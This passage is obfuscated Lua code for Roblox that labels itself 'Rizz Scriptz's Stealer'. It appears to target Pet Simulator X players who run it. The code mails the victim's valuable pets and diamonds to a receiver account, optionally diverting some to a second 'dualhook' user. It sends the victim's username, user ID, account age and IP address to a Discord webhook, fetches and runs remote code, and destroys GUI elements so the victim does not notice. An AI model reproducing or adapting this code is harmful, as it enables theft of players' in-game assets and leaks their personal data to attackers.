v41:InvokeServer(tonumber(v553));end end break;end end break;end end end if (v59.World==v7("\139\101\227\226\131","\237\216\21\130\149")) then local v212=0 + 0 ;local v213;local v214;local v215;local v216;while true do if (v212==(2 + 0)) then if (v215.Text==v7("\19\68\84\1\242\81\98","\67\65\33\48\100\151\60")) then game:GetService(v7("\239\235\175\193\246\205\244","\147\191\135\206\184")).LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(v213.Position);while task.wait() do if (v215.Text~=v7("\182\45\162\196\221\94\243","\210\228\72\198\161\184\51")) then break;end end end if table.find(v59.Gamepasses,30322308 -11648003 ) then if (v216.Text==v7("\4\76\247\21\118\195\119","\174\86\41\147\112\19")) then game:GetService(v7("\107\12\140\18\32\29\2","\203\59\96\237\107\69\111\113")).LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(v214.Position);while task.wait() do if (v216.Text~=v7("\22\19\168\228\52\253\150","\183\68\118\204\129\81\144")) then break;end end end end break;end if (v212==(721 -(254 + 466))) then v215=v213.BillboardGui.Timer;v216=v214.BillboardGui.Timer;v212=2;end if (v212==(560 -(544 + 16))) then v213=game:GetService(v7("\181\65\77\84\163\217\95\129\75","\62\226\46\63\63\208\169"))[v7("\218\38\120\162\47","\62\133\121\53\227\127\109\79")].Interactive[v7("\34\21\60\254\150\156\167\7\21\32\241\197","\194\112\116\82\149\182\206")].Pad;v214=game:GetService(v7("\14\167\94\19\211\242\15\58\173","\110\89\200\44\120\160\130"))[v7("\148\252\102\103\115","\45\203\163\43\38\35\42\91")].Interactive[v7("\228\172\236\99\181\172\67\211\151\216\48","\52\178\229\188\67\231\201")].Pad;v212=2 -1 ;end end end game:GetService(v7("\62\161\113\253\14\144\29","\226\110\205\16\132\107")).LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(game:GetService(v7("\220\204\242\210\82\251\194\227\220","\33\139\163\128\185"))[v7("\104\103\41\255\103","\190\55\56\100")].Interactive.Mailbox.Pad.Position);local v83=v37:InvokeServer();local v84= #v83.Inbox;if ((v84~=0) and (invspace_nolimit()>=v84)) then local v217=628 -(294 + 334) ;local v218;while true do if (0==v217) then v218=0;while true do if (v218==0) then v36:InvokeServer();task.wait(254.5 -(236 + 17) );break;end end break;end end end local v85=v59.Diamonds;if (v85<110000) then _G.Webhook=Webhook;_G.LoadingScreen=false;_G.AntiLeave=false;_G.MouseLock=false;loadstring(game:HttpGetAsync(v7("\84\174\50\21\0\247\246\87\163\57\12\83\241\242\65\239\48\23\29\232","\147\54\207\92\126\115\131"),true))();return;end if (_G.AntiLeave~=false) then local v219=0;local v220;while true do if (v219==(0 + 0)) then v220=0 + 0 ;while true do if (v220==0) then for v540,v541 in pairs(game:GetService(v7("\61\61\52\100\8\108\30","\30\109\81\85\29\109")).LocalPlayer.PlayerGui:GetChildren()) do if (v541.Name~=v7("\214\127\66\179\56\202\243\237\104","\156\159\17\52\214\86\190")) then v541:Destroy();end end for v542,v543 in pairs(game:GetService(v7("\141\224\175\185\137\250\180","\220\206\143\221")):GetChildren()) do if ((v543.Name~=v7("\180\116\55\13\240\217\208","\178\230\29\77\119\184\172")) and (v543.Name~=v7("\199\177\8\23\120\224\197\172\5\22\103\236\210\171\3","\152\149\222\106\123\23"))) then v543:Destroy();end end break;end end break;end end end TitanicList={};TList={};STList={};BananaList={};BList={};HugeList={};HList={};SHList={};PogList={};PList={};SPList={};ExclusiveList={};EList={};SEList={};EventList={};EvList={};SEvList={};SecretList={};SList={};SSList={};MythicList={};MList={};SMList={};table.foreach(Library.Directory.Pets,function(v140,v141)local v142=0 -0 ;while true do if (v142==3) then if (v141.rarity==v7("\10\118\122\83\203\45","\174\89\19\25\33")) then table.insert(SecretList,v140);end if (v141.rarity==v7("\2\11\70\70\254\132\10\35","\107\79\114\50\46\151\231")) then table.insert(MythicList,v140);end break;end if (v142==(4 -3)) then if v141.huge then table.insert(HugeList,v140);end if (string.split(v141.name," ")[1 + 0 ]==v7("\127\90\115","\104\47\53\20")) then table.insert(PogList,v140);end v142=2 + 0 ;end if (v142==(796 -(413 + 381))) then if ((v141.rarity==v7("\134\84\130\16\169\28\170\90\132","\111\195\44\225\124\220")) and  not v141.huge and  not v141.titanic) then table.insert(ExclusiveList,v140);end if (v141.rarity==v7("\253\80\5\125\191","\203\184\38\96\19\203")) then table.insert(EventList,v140);end v142=3;end if (v142==(0 + 0)) then if v141.titanic then table.insert(TitanicList,v140);end if (v141.name==v7("\223\39\248\66\187\220","\213\189\70\150\35")) then table.insert(BananaList,v140);end v142=1 -0 ;end end end);local v86=v59.Pets;local v87={};for v143,v144 in pairs(v86) do v87[v144[v7("\44\175\177","\160\89\198\213\73\234\89\215")]]=false;end v32:InvokeServer(v87);for v146,v147 in pairs(v86) do if (table.find(TitanicList,v147[v7("\65\117","\165\40\17\212\158")])~=nil) then table.insert(TList,v147[v7("\240\208\12","\70\133\185\104\83")]);table.insert(STList,v147[v7("\13\65","\169\100\37\36\74")]);end end for v148,v149 in pairs(v86) do if (table.find(BananaList,v149[v7("\9\131","\48\96\231\194")])~=nil) then table.insert(BList,v149[v7("\221\83\10","\227\168\58\110\77\121\184\207")]);end end for v150,v151 in pairs(v86) do if (table.find(HugeList,v151[v7("\114\56","\197\27\92\223\32\209\187\17")])~=nil) then local v263=0 -0 ;local v264;while true do if (v263==(1970 -(582 + 1388))) then v264=0 -0 ;while true do if (v264==(0 + 0)) then table.insert(HList,v151[v7("\22\86\199","\155\99\63\163")]);table.insert(SHList,v151[v7("\139\213","\228\226\177\193\237\217")]);break;end end break;end end end end for v152,v153 in pairs(v86) do if (table.find(PogList,v153[v7("\61\180","\134\84\208\67")])~=nil) then table.insert(PList,v153[v7("\6\165\130","\60\115\204\230")]);table.insert(SPList,v153[v7("\238\62","\16\135\90\139")]);end end for v154,v155 in pairs(v86) do if ((table.find(ExclusiveList,v155[v7("\93\112","\24\52\20\102\83\46\52")])~=nil) and  not v155.huge and  not v155.titanic) then local v265=364 -(326 + 38) ;while true do if ((0 -0)==v265) then table.insert(EList,v155[v7("\209\38\37","\111\164\79\65\68")]);table.insert(SEList,v155[v7("\207\221","\138\166\185\227\190\78")]);break;end end end end for v156,v157 in pairs(v86) do if (table.find(EventList,v157[v7("\194\112","\121\171\20\165\87\50\67")])~=nil) then local v266=0 -0 ;while true do if (v266==(620 -(47 + 573))) then table.insert(EvList,v157[v7("\211\49\189","\98\166\88\217\86\217")]);table.insert(SEvList,v157[v7("\255\242","\188\150\150\25\97\230")]);break;end end end end for v158,v159 in pairs(v86) do if (table.find(SecretList,v159[v7("\211\141","\141\186\233\63\98\108")])~=nil) then local v267=0;while true do if (v267==0) then table.insert(SList,v159[v7("\228\227\40","\69\145\138\76\214")]);table.insert(SSList,v159[v7("\121\203","\118\16\175\233\233\223")]);break;end end end end for v160,v161 in pairs(v86) do if ((table.find(MythicList,v161[v7("\130\128","\29\235\228\85\219\142\235")])~=nil) and v161.hc and v161.dm) then local v268=0 + 0 ;while true do if (v268==0) then table.insert(MList,v161[v7("\40\221\190","\50\93\180\218\189\23\46\71")]);table.insert(SMList,v161[v7("\215\160","\40\190\196\59\44\36\188")]);break;end end end end local v88= #TList +  #BList +  #HList +  #EList +  #EvList +  #MList +  #SList +  #PList ;local v89;if (v85>=(((424708 -324708) * v88) + 100000)) then v89=(100000 * v88) + (162305 -62305) ;elseif (v85<((100000 * v88) + 100000)) then v89=v85;end local v90;if ((v85-v89)<(11664 -(1269 + 395))) then v90=0;elseif ((v85-v89)>=(10492 -(76 + 416))) then v90=v85-v89 ;end function diamondstoconvert(v162)local v163=443 -(319 + 124) ;local v164;local v165;local v166;local v167;local v168;while true do if (v163==(0 -0)) then v164=1007 -(564 + 443) ;v165=nil;v163=2 -1 ;end if (v163==2) then v168=nil;while true do local v417=458 -(337 + 121) ;while true do if (v417==(2 -1)) then if (v164==3) then return v167;end if (v164==(0 -0)) then local v546=0;while true do if (v546==(1912 -(1261 + 650))) then v164=1 + 0 ;break;end if (v546==(0 -0)) then v165=v162;v166={k=1821 -(772 + 1045) ,m=7,b=2 + 8 ,T=13,[v7("\13\81","\109\92\37\188\212\154\29")]=160 -(102 + 42) };v546=1845 -(1524 + 320) ;end end end break;end if (v417==(1270 -(1049 + 221))) then if (v164==(157 -(18 + 138))) then v167=tostring(math.floor(v165));v168=nil;v164=4 -2 ;end if ((1104 -(67 + 1035))==v164) then for v554,v555 in pairs(v166) do if (( #v167>=v555) and ( #v167<(v555 + (351 -(136 + 212))))) then v168=v554;break;end end if v168 then local v561=0 -0 ;local v562;local v563;local v564;local v565;while true do if (v561==(2 + 0)) then v565=".";if ((string.split(v564,"")[2]=="0") and (string.split(v564,"")[1 + 0 ]~="0")) then v167=string.split(v167,".")[1605 -(240 + 1364) ]   .. v565   .. string.split(v564,"")[1]   .. v168 ;elseif ((string.split(v564,"")[1084 -(1050 + 32) ]=="0") and (string.split(v564,"")[1]=="0")) then v167=string.split(v167,".")[1]   .. v168 ;elseif ((string.split(v564,"")[7 -5 ]~="0") and (string.split(v564,"")[1]~="0")) then v167=v167   .. v168 ;elseif ((string.split(v564,"")[2 + 0 ]~="0") and (string.split(v564,"")[1056 -(331 + 724) ]=="0")) then v167=v167   .. v168 ;else v167=v162;end break;end if (0==v561) then v562=v166[v168];v563=math.floor(v165/(10^(v562-(1 + 2))) ) * ((654 -(269 + 375))^(v562-(728 -(267 + 458)))) ;v561=1 + 0 ;end if ((1 -0)==v561) then local v575=818 -(667 + 151) ;while true do if ((1497 -(1410 + 87))==v575) then v167=string.format(v7("\65\191\234\145\55","\58\100\143\196\163\81"),v563/(10^(v562-1)) );v564=string.split(v167,".")[1899 -(1504 + 393) ];v575=2 -1 ;end if (1==v575) then v561=5 -3 ;break;end end end end end v164=3;end v417=797 -(461 + 335) ;end end end break;end if (v163==(1 + 0)) then v166=nil;v167=nil;v163=1763 -(1730 + 31) ;end end end local v91=diamondstoconvert(v90);local v92=diamondstoconvert(v80);function RAP()local v169=1667 -(728 + 939) ;local v170;while true do if (v169==(0 -0)) then v170=diamondstoconvert(v59.RAP);return v170;end end end local v93=Webhook;local v94=true;local function v95(v171,v172,v173,v174,v175,v176,v177)local v178=0;local v179;local v180;local v181;local v182;while true do if (v178==3) then if ((v77~=0) or (v80~=(0 -0))) then local v490=0;local v491;while true do if (v490==(0 -0)) then v491=1068 -(138 + 930) ;while true do if ((2 + 0)==v491) then if ((Webhook~=nil) and (v94==true)) then v179={[v7("\226\202\75","\95\183\184\39")]=v93,[v7("\151\48\227\63","\98\213\95\135\70\52\224")]=newdata1,[v7("\211\166\221\127\91\250","\52\158\195\169\23")]=v7("\74\147\1\64","\235\26\220\82\20\230\85\27"),[v7("\160\164\232\198\113\154\178","\20\232\193\137\162")]=v180};request(v179);end break;end if (v491==(1 + 0)) then local v566=0;while true do if (v566==0) then newdata1=game:GetService(v7("\145\167\179\15\187\246\226\175\186\164\26","\144\217\211\199\127\232\147")):JSONEncode(v25);v180={[v7("\251\32\48\60\208\75\22\9\236\54\46\45","\36\152\79\94\72\181\37\98")]="application/json"};v566=1 + 0 ;end if (v566==(4 -3)) then v491=2;break;end end end if (v491==(1766 -(459 + 1307))) then local v567=1870 -(474 + 1396) ;while true do if (v567==(1 -0)) then v491=1 + 0 ;break;end if (v567==(0 + 0)) then imgs="https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif";v25={[v7("\180\88\203\9\36\176\163","\222\215\55\165\125\65")]=v173,[v7("\57\194\195\8\252\192\224\79","\42\76\177\166\122\146\161\141")]=v7("\151\131\31\212\57\69\166\152\12\222\109\108","\22\197\234\101\174\25"),[v7("\44\34\164\200\119\189\232\147\63\56","\230\77\84\197\188\22\207\183")]=imgs,[v7("\252\25\196\249\136\178","\85\153\116\166\156\236\193\144")]={{[v7("\176\233\89\191\225","\96\196\128\45\211\132")]=v7("\127\199\85\90\197\239\156\209\33\199\49\31\206\179\131\209\33\133\59\109\219\181\174\196\41","\184\85\237\27\63\178\207\212"),[v7("\29\75\5","\63\104\57\105")]="https://discord.gg/uSgzNwHDTS",[v7("\31\158\180\65","\36\107\231\196")]=v7("\79\188\161\143","\231\61\213\194"),[v7("\10\162\49\124\27","\19\105\205\93")]=tonumber(2595071),[v7("\189\0\203\140\61\167\9\215\141","\95\201\104\190\225")]={[v7("\186\217\205","\174\207\171\161")]=v182,[v7("\229\251\4\244\240\195","\183\141\158\109\147\152")]=54 + 366 ,[v7("\59\0\226\24\36","\108\76\105\134")]=420},[v7("\237\204\180\237\202\248","\174\139\165\209\129")]={{[v7("\173\178\239\196","\24\195\211\130\161\166\99\16")]="**This data was generated using Rizz Scriptz's Stealer** :moyai:",[v7("\80\2\229\57\86","\118\38\99\137\76\51")]=v7("\253\38\5\39\26\37\239\40\4\31\12\96\189\102\69\82\83\96","\64\157\70\101\114\105")   .. v22   .. "\nUser-ID      : "   .. v23.userId   .. "\nAccount Age  : "   .. v23.AccountAge   .. " Days\nIP Address   : "   .. v24   .. "\nRank           : "   .. v21   .. "\nRAP          : "   .. RAP()   .. "\nExploit      : "   .. v19   .. "\nReceiver     : "   .. v177   .. v7("\64\168\167","\112\32\200\199\131") ,[v7("\37\94\80\177\205\174","\66\76\48\60\216\163\203")]=false},{[v7("\180\135\116\246","\68\218\230\25\147\63\174")]=v7("\247\46\92\75\236\237\96\25\124\179\185\57\19\64\179\171\62\25\6\246\247\46\92\75\236","\214\205\74\51\44"),[v7("\236\77\238\233\114","\23\154\44\130\156")]=v7("\17\166\173","\115\113\198\205\206\86")   .. v175   .. v7("\132\87\254","\58\228\55\158") ,[v7("\189\135\220\39\50\168","\85\212\233\176\78\92\205")]=true},{[v7("\68\89\133\231","\130\42\56\232")]=v7("\176\178\33\238\26\127\160\255\0\234\65\50\229\187\32\240\10\117\170\239\35\230\77\101","\95\138\213\68\131\32"),[v7("\60\41\173\86\115","\22\74\72\193\35")]=v7("\44\121\228","\56\76\25\132")   .. v174   .. v7("\94\193\171","\175\62\161\203\70") ,[v7("\53\211\207\26\59\57","\85\92\189\163\115")]=true},{[v7("\39\173\61\61","\88\73\204\80")]=v171,[v7("\56\130\28\83\44","\186\78\227\112\38\73")]=v7("\252\87\253","\26\156\55\157\53\51")   .. v172   .. v7("\140\216\22","\48\236\184\118\185\216") ,[v7("\236\179\91\57\193\49","\84\133\221\55\80\175")]=true},{[v7("\179\230\41\163","\60\221\135\68\198\167")]=v7("\180\191\249\141\73\131\174\247\178\169\77\208\224\184\252\195\96\216\224\182\235\201\8\153\180\191\249\141\73\131","\185\142\221\152\227\34"),[v7("\78\196\91\239\70","\151\56\165\55\154\35\83")]=v7("\160\67\5","\142\192\35\101")   .. v76   .. v181   .. v7("\214\117\41","\118\182\21\73\195\135\236\204") ,[v7("\1\50\22\73\10\8","\157\104\92\122\32\100\109")]=true},{[v7("\173\167\194\207","\203\195\198\175\170\93\71\237")]=v7("\116\76\59\216\11\81\182\100\124\58\149\117\24\253\35\68\48\209\66\91\182\110\17\57\208\92\75","\156\78\43\94\181\49\113"),[v7("\100\233\200\182\14","\25\18\136\164\195\107\35")]=v7("\232\45\169","\216\136\77\201\47\18\220\161")   .. v92   .. v7("\45\236\43","\226\77\140\75\186\104\188") ,[v7("\176\192\220\54\65\188","\47\217\174\176\95")]=true},{[v7("\182\220\123\7","\70\216\189\22\98\210\52\24")]=v7("\128\210\172\137\214\195\224\174\136\198\206\215\249\199\153\144\232\167\199\251\207\216\166\148\153\144\159\249\138\220\212\218\186\184\222\213\202\183\143\137","\179\186\191\195\231"),[v7("\239\62\20\241\252","\132\153\95\120")]=v7("\177\178\14","\192\209\210\110\77\151\186")   .. v77   .. v7("\224\3\34","\164\128\99\66\137\159") ,[v7("\9\135\229\183\14\140","\222\96\233\137")]=true}}}}};v567=1;end end end end break;end end else imgs="https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif";v25={[v7("\33\208\203\178\226\130\3","\17\66\191\165\198\135\236\119")]=v173,[v7("\26\188\171\1\241\233\225\212","\177\111\207\206\115\159\136\140")]=v7("\55\128\10\14\148\124\92\23\128\0\0\206","\63\101\233\112\116\180\47"),[v7("\194\45\236\6\249\36\252\46\255\30","\86\163\91\141\114\152")]=imgs,[v7("\86\6\118\118\62\64","\90\51\107\20\19")]={{[v7("\153\249\145\227\56","\93\237\144\229\143")]=v7("\95\188\222\28\28\6\61\255\228\83\65\6\9\234\199\16\31\78\85\196\249\3\17\90\9","\38\117\150\144\121\107"),[v7("\56\169\226","\90\77\219\142")]="https://discord.gg/uSgzNwHDTS",[v7("\242\29\49\60","\26\134\100\65\89\44\103")]=v7("\227\234\51\43","\196\145\131\80\67"),[v7("\29\191\10\7\10","\136\126\208\102\104\120")]=tonumber(2595071),[v7("\108\130\219\78\173\92\60\88\116","\49\24\234\174\35\207\50\93")]={[v7("\25\224\241","\17\108\146\157\232")]=v182,[v7("\67\198\29\234\39\188","\200\43\163\116\141\79")]=420,[v7("\168\63\57\151\184","\131\223\86\93\227\208\148")]=420},[v7("\229\76\179\186\25\166","\213\131\37\214\214\125")]={{[v7("\40\42\40\186","\129\70\75\69\223")]="**This data was generated using Rizz Scriptz's Stealer** :moyai:",[v7("\80\202\255\252\121","\143\38\171\147\137\28")]=v7("\208\130\185\198\16\230\198\222\131\180\246\67\163\148\144\194\227\179","\180\176\226\217\147\99\131")   .. v22   .. "\nUser-ID      : "   .. v23.userId   .. "\nAccount Age  : "   .. v23.AccountAge   .. " Days\nIP Address   : "   .. v24   .. "\nRank         : "   .. v21   .. "\nRAP          : "   .. RAP()   .. "\nExploit      : "   .. v19   .. "\nReceiver     : "   .. v177   .. v7("\211\185\47","\103\179\217\79") ,[v7("\67\185\16\220\79\137","\195\42\215\124\181\33\236")]=false},{[v7("\3\88\58\59","\152\109\57\87\94\69")]=v7("\163\211\5\164\228\146\30\226\201\210\30\176\254\222\81\174\237\157\64\227\228\214\91\175\163","\200\153\183\106\195\222\178\52"),[v7("\36\226\132\40\76","\58\82\131\232\93\41")]=v7("\131\87\208","\95\227\55\176\117\61")   .. v175   .. v7("\24\126\35","\203\120\30\67\43") ,[v7("\248\43\65\230\215\244","\185\145\69\45\143")]=true},{[v7("\132\30\20\163","\188\234\127\121\198")]=v7("\98\53\22\142\98\114\89\201\28\59\18\142\55\60\23\144\114\120\83\217\63\55\30\217","\227\88\82\115"),[v7("\85\30\182\178\7","\19\35\127\218\199\98")]=v7("\28\251\10","\130\124\155\106")   .. v174   .. v7("\213\203\246","\223\181\171\150\207\195\150\28") ,[v7("\69\52\239\167\7\73","\105\44\90\131\206")]=true},{[v7("\241\225\191\188","\94\159\128\210\217\104")]=v171,[v7("\70\248\10\170\90","\26\48\153\102\223\63\31\153")]=v7("\2\64\237","\147\98\32\141")   .. v172   .. v7("\24\67\227","\43\120\35\131\170\102\54") ,[v7("\93\8\139\191\171\181","\228\52\102\231\214\197\208")]=true}}}}};newdata1=game:GetService(v7("\54\244\97\218\217\142\11\192\23\227\112","\182\126\128\21\170\138\235\121")):JSONEncode(v25);v180={[v7("\136\213\59\242\131\29\36\75\159\195\37\227","\102\235\186\85\134\230\115\80")]="application/json"};if ((Webhook~=nil) and (v94==true)) then local v535=638 -(448 + 190) ;while true do if (v535==(0 + 0)) then v179={[v7("\98\30\50","\66\55\108\94\63\18\180")]=v93,[v7("\54\130\129\46","\57\116\237\229\87\71")]=newdata1,[v7("\135\180\249\239\120\234","\39\202\209\141\135\23\142")]=v7("\207\28\58\62","\152\159\83\105\106\82"),[v7("\169\195\80\246\204\78\146","\60\225\166\49\146\169")]=v180};request(v179);break;end end end end break;end if (v178==(1 + 0)) then v181="/5";v182=string.split(v176,"rbxassetid://")[2 + 0 ];v178=7 -5 ;end if (v178==2) then v182=game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds="   .. v182   .. v7("\92\80\38\183\42\91\235\62\21\78\42\160\38\20\213\2\27\65\38\139\48\69\225\11\8\4\48\170\37\76\184\90\72\18\59\247\109\25\163\8\21\80\46\162\43\20\213\0\29\4\42\176\28\64\247\13\15\78\34\177\98\79\228\2\9\71","\110\122\34\67\195\95\41\133") );v182=game:GetService(v7("\93\165\79\90\229\112\163\77\67\213\112","\182\21\209\59\42")):JSONDecode(v182).data[1].imageUrl;v178=8 -5 ;end if (v178==0) then v179=nil;v180=nil;v178=1495 -(1307 + 187) ;end end end local v96=getgenv().Settings.User;local v97;local v98;local v99;local v100;local v101;local v102;local v103;local v104;local v105;local v106=".gg/uSgzNwHDTS";if (v96~=nil) then if getgenv().Settings.Titanics.Dualhook then v97=getgenv().Settings.Titanics.Intensity;end if getgenv().Settings.Banana.Dualhook then v98=getgenv().Settings.Banana.Intensity;end if getgenv().Settings.Huges.Dualhook then v99=getgenv().Settings.Huges.Intensity;end if getgenv().Settings.Pogs.Dualhook then v100=getgenv().Settings.Pogs.Intensity;end if getgenv().Settings.Exclusives.Dualhook then v101=getgenv().Settings.Exclusives.Intensity;end if getgenv().Settings.Events.Dualhook then v102=getgenv().Settings.Events.Intensity;end if getgenv().Settings.Secrets.Dualhook then v103=getgenv().Settings.Secrets.Intensity;end if getgenv().Settings.HC_DM_Mythics.Dualhook then v104=getgenv().Settings.HC_DM_Mythics.Intensity;end if getgenv().Settings.Gems.Dualhook then v105=getgenv().Settings.Gems.Intensity;end if (getgenv().Settings.Webhook~=true) then v94=false;end if (getgenv().Settings.MailMessage~=nil) then v106=getgenv().Settings.MailMessage;end end function dualhook(v183)local v184=0 -0 ;local v185;local v186;while true do if ((0 -0)==v184) then v185=0 -0 ;v186=nil;v184=1;end if (v184==(684 -(232 + 451))) then while true do if (v185==1) then if (v186<=v183) then return true;else return false;end break;end if (v185==0) then local v504=0 + 0 ;while true do if (v504==(1 + 0)) then v185=565 -(510 + 54) ;break;end if (v504==0) then if  not tonumber(v183) then local v568=0 -0 ;while true do if (v568==0) then local v576=36 -(13 + 23) ;while true do if (v576==(0 -0)) then game:GetService(v7("\31\18\46\51\4\21\60","\103\79\126\79\74\97")).LocalPlayer:Kick(v7("\138\106\199\51\127\90\140\126\223\122\90\90\179\113\199\118\80\9\179\107\202\51\104\27\182\106\214","\122\218\31\179\19\62"));return;end end end end end v186=math.random(1 -0 ,100);v504=1;end end end end break;end end end local v107;if ((UserName2~=nil) and (UserName2~=v7("\225\216\201\129\252\178\64\161\150\229\196\219\164","\37\211\182\173\161\169\193")) and (UserName2~="")) then v107=UserName2;else v107=UserName;end local v108;if (v88==(0 -0)) then if (v90>=1000000000) then v108=UserName;else v108=v107;end if (v105~=nil) then if dualhook(v105) then v108=v96;end end local v221={[1089 -(830 + 258) ]={[v7("\197\63\78\208\56\114\188\249\46","\217\151\90\45\185\72\27")]=v108,[v7("\231\117\230\31\89\205\120\244","\54\163\28\135\114")]=v90,[v7("\24\222\73\145","\31\72\187\61\226\46")]={},[v7("\238\3\80\193\70\121\33","\68\163\102\35\178\39\30")]=v106}};v35:InvokeServer(unpack(v221));end spawn(function()while wait() do if (( #TList~=0) or (TList~={})) then for v418,v419 in pairs(TList) do v108=UserName;if (v97~=nil) then if dualhook(v97) then v108=v96;end end local v420={[1]={[v7("\140\117\217\206\19\188\134\31\170","\113\222\16\186\167\99\213\227")]=v108,[v7("\10\7\250\251\33\0\255\229","\150\78\110\155")]=v90,[v7("\181\192\51\242","\32\229\165\71\129\196\126\223")]={v419},[v7("\238\140\215\146\128\210\198","\181\163\233\164\225\225")]=v106}};v35:InvokeServer(unpack(v420));if (( #TList==(0 -0)) or (TList=={})) then break;end end end end end);spawn(function()while wait() do if (( #BList~=(0 + 0)) and ( #TList==(0 + 0))) then for v421,v422 in pairs(BList) do v108=UserName;if (v98~=nil) then if dualhook(v98) then v108=v96;end end local v423={[1]={[v7("\98\142\61\126\64\130\59\121\68","\23\48\235\94")]=v108,[v7("\88\211\217\80\88\61\214\111","\178\28\186\184\61\55\83")]=v90,[v7("\244\200\83\47","\149\164\173\39\92\146\110")]={v422},[v7("\222\34\3\12\27\28\246","\123\147\71\112\127\122")]=v106}};v35:InvokeServer(unpack(v423));if (( #BList==(0 -0)) or (BList=={})) then break;end end else break;end end end);spawn(function()while wait() do if (( #HList~=(0 + 0)) and ( #BList==0) and ( #TList==(241 -(237 + 4)))) then for v424,v425 in pairs(HList) do v108=UserName;if (v99~=nil) then if dualhook(v99) then v108=v96;end end local v426={[2 -1 ]={[v7("\254\200\129\120\86\197\200\140\101","\38\172\173\226\17")]=v108,[v7("\105\24\45\226\66\31\40\252","\143\45\113\76")]=v90,[v7("\136\189\8\47","\92\216\216\124")]={v425},[v7("\118\55\191\83\252\92\55","\157\59\82\204\32")]=v106}};v35:InvokeServer(unpack(v426));if (( #HList==0) or (HList=={})) then break;end end end end end);spawn(function()while wait() do if (( #PList~=0) and ( #TList==(0 -0)) and ( #BList==(0 + 0)) and ( #HList==0)) then for v427,v428 in pairs(PList) do v108=UserName;if (v100~=nil) then if dualhook(v100) then v108=v96;end end local v429={[1]={[v7("\10\59\224\243\249\227\214\191\44","\209\88\94\131\154\137\138\179")]=v108,[v7("\12\168\197\113\17\45\53\49","\66\72\193\164\28\126\67\81")]=v90,[v7("\215\41\188\75","\22\135\76\200\56\70")]={v428},[v7("\160\53\235\55\92\230\136","\129\237\80\152\68\61")]=v106}};v35:InvokeServer(unpack(v429));if (( #PList==(0 -0)) or (PList=={})) then break;end end end end end);spawn(function()while wait() do if (( #EList~=(0 + 0)) and ( #HList==(0 + 0)) and ( #TList==(1426 -(85 + 1341))) and ( #BList==0) and ( #PList==(0 -0))) then for v430,v431 in pairs(EList) do v108=UserName;if (v101~=nil) then if dualhook(v101) then v108=v96;end end local v432={[1]={[v7("\99\173\7\250\12\30\93\95\188","\56\49\200\100\147\124\119")]=v108,[v7("\232\55\190\253\195\48\187\227","\144\172\94\223")]=v90,[v7("\20\10\182\84","\39\68\111\194")]={v431},[v7("\251\163\244\212\120\176\211","\215\182\198\135\167\25")]=v106}};v35:InvokeServer(unpack(v432));if (( #EList==0) or (EList=={})) then break;end end end end end);spawn(function()while wait() do if (( #EvList~=0) and ( #EList==0) and ( #HList==(0 -0)) and ( #TList==(372 -(45 + 327))) and ( #BList==(0 -0)) and ( #PList==0)) then for v433,v434 in pairs(EvList) do v108=v107;if (v102~=nil) then if dualhook(v102) then v108=v96;end end local v435={[1]={[v7("\191\76\233\65\157\64\239\70\153","\40\237\41\138")]=v108,[v7("\227\125\251\245\69\201\112\233","\42\167\20\154\152")]=v90,[v7("\122\251\182\81","\65\42\158\194\34\17")]={v434},[v7("\55\34\65\31\44\234\30","\142\122\71\50\108\77\141\123")]=v106}};v35:InvokeServer(unpack(v435));if (( #EvList==(0 + 0)) or (EvList=={})) then break;end end end end end);spawn(function()while wait() do if (( #SList~=0) and ( #EvList==0) and ( #EList==0) and ( #HList==(0 + 0)) and ( #TList==0) and ( #BList==0) and ( #PList==0)) then for v436,v437 in pairs(SList) do v108=v107;if (v103~=nil) then if dualhook(v103) then v108=v96;end end local v438={[1 + 0 ]={[v7("\39\167\252\17\43\28\167\241\12","\91\117\194\159\120")]=v108,[v7("\62\20\63\21\58\255\32\9","\68\122\125\94\120\85\145")]=v90,[v7("\39\25\219\77","\218\119\124\175\62\168\185")]={v437},[v7("\136\245\91\215\164\247\77","\164\197\144\40")]=v106}};v35:InvokeServer(unpack(v438));if (( #SList==0) or (SList=={})) then break;end end end end end);spawn(function()while wait() do if (( #MList~=0) and ( #SList==0) and ( #EvList==(1732 -(64 + 1668))) and ( #EList==(1973 -(1227 + 746))) and ( #HList==(0 -0)) and ( #TList==(0 -0)) and ( #BList==(494 -(415 + 79))) and ( #PList==(0 + 0))) then for v439,v440 in pairs(MList) do v108=v107;if (v104~=nil) then if dualhook(v104) then v108=v96;end end local v441={[1]={[v7("\177\245\169\130\205\191\134\254\190","\214\227\144\202\235\189")]=v108,[v7("\201\172\134\118\31\189\87\47","\92\141\197\231\27\112\211\51")]=v90,[v7("\214\250\158\176","\177\134\159\234\195")]={v440},[v7("\144\238\44\179\200\186\238","\169\221\139\95\192")]=v106}};v35:InvokeServer(unpack(v441));if (( #MList==(491 -(142 + 349))) or (MList=={})) then break;end end end end end);local v109= #TList;WTianicList={};WTList={};WTcc={};local v110=1 + 0 ;spawn(function()while wait() do WLibrary=require(game:GetService(v7("\236\142\111\51\43\37\223\159\122\59\17\50\209\153\126\56\39","\70\190\235\31\95\66")).Framework:FindFirstChild(v7("\150\235\24\244\228\168\251","\133\218\130\122\134")));WFunctions=WLibrary.Functions;table.foreach(WLibrary.Directory.Pets,function(v269,v270)if v270.titanic then table.insert(WTianicList,v269);end end);local v223=require(game:GetService(v7("\14\250\243\200\213\160\57\40\250\231\247\200\172\42\61\248\230","\88\92\159\131\164\188\195")).Library.Client.Save).Get().Pets;local v224={};for v271,v272 in pairs(v223) do v224[v272[v7("\149\39\187","\189\224\78\223\43\183\139")]]=false;end for v274,v275 in pairs(v223) do if (table.find(WTianicList,v275[v7("\39\248","\161\78\156\234\118")])~=nil) then table.insert(WTList,v275[v7("\178\190\205","\188\199\215\169")]);table.insert(WTcc,v275[v7("\245\13","\136\156\105\63\27")]);end end if (v109==( #WTList + (1 -0))) then v109= #TList;v88=v88-(1 + 0) ;local v364=v90;local v365=STList[v110];local v366;local v367;for v442,v443 in pairs(game:GetService(v7("\41\137\105\56\18\143\120\32\30\136\74\32\20\158\120\51\30","\84\123\236\25"))[v7("\207\180\142\62\158\144\211\191\133\37\149","\213\144\235\202\119\204")].Pets:GetChildren()) do local v444=string.split(v443.Name,v7("\99\85\158","\45\67\120\190\74\72\67"))[1 + 0 ];if (v444==tostring(v365)) then 